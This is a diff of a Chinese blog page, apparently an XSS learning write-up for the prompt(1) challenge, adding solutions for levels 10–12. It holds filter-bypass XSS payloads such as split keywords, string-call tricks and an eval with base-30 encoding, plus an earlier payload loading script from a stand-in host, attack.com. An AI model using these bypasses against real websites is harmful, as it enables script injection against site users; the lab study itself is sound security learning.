@@ -247,7 +247,7 @@
 
     
         <meta property="article:published_time" content="Fri Mar 16 2018 19:40:00 GMT+0800" />
-        <meta property="article:modified_time" content="Sat Mar 17 2018 15:28:35 GMT+0800" />
+        <meta property="article:modified_time" content="Sat Mar 17 2018 15:59:26 GMT+0800" />
     
 
     <!-- The Twitter Card protocol -->
@@ -274,7 +274,7 @@
     "mainEntityOfPage": "http://blog.hac425.top/2018/03/16/learn_xss.html",
     "headline": "XSS学习(未完..)",
     "datePublished": "Fri Mar 16 2018 19:40:00 GMT+0800",
-    "dateModified": "Sat Mar 17 2018 15:28:35 GMT+0800",
+    "dateModified": "Sat Mar 17 2018 15:59:26 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "hac425",
@@ -613,6 +613,20 @@
 <p>最后的 <code>payload</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;ſvg&gt;&lt;ſcript/href=attack.com&gt;</div></pre></td></tr></table></figure>
 <p><strong>第10关</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521272114576gk5e59jp.png?imageslim" alt="paste image"></p>
+<p>首先替换 <code>prompt</code> 为 <code>alert</code> ，后面又 清除了 <code>&#39;</code> , 这种 <strong>前过滤 后 清除</strong> 的做法，可以用来绕过前面的过滤.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pro&apos;mpt(1)</div></pre></td></tr></table></figure>
+<p><strong>第11关</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521272797270o6xb1wy9.png?imageslim" alt="paste image"></p>
+<p>过滤之后，进入 <code>&lt;script&gt;</code> 作为赋值字符串的一部分。</p>
+<p>有一个知识点,在脚本环境中，<code>&quot;string&quot;(alert(1))</code> 不会报错，且会正确执行，而为了使语法正确，使用 <code>in</code> 关键字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;(prompt(1))in&quot;</div></pre></td></tr></table></figure>
+<p><strong>第12关</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521273216871kk18so8n.png?imageslim" alt="paste image"></p>
+<p>第 <code>10</code> 关的一个改进，先过滤然后才清除。</p>
+<p>在 <code>javascript</code> 中可以 使用 <code>parseInt</code> 把字符串转成数字，然后用 <code>(num).toString</code> 转成字符串， 同时还有一个有意思的点，用 <code>eval</code> 执行 <code>function_name</code> 返回值就是该函数的对象。于是</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521273543659v91san5g.png?imageslim" alt="paste image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval((630038579).toString(30))(1)</div></pre></td></tr></table></figure>
 
         
                 <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
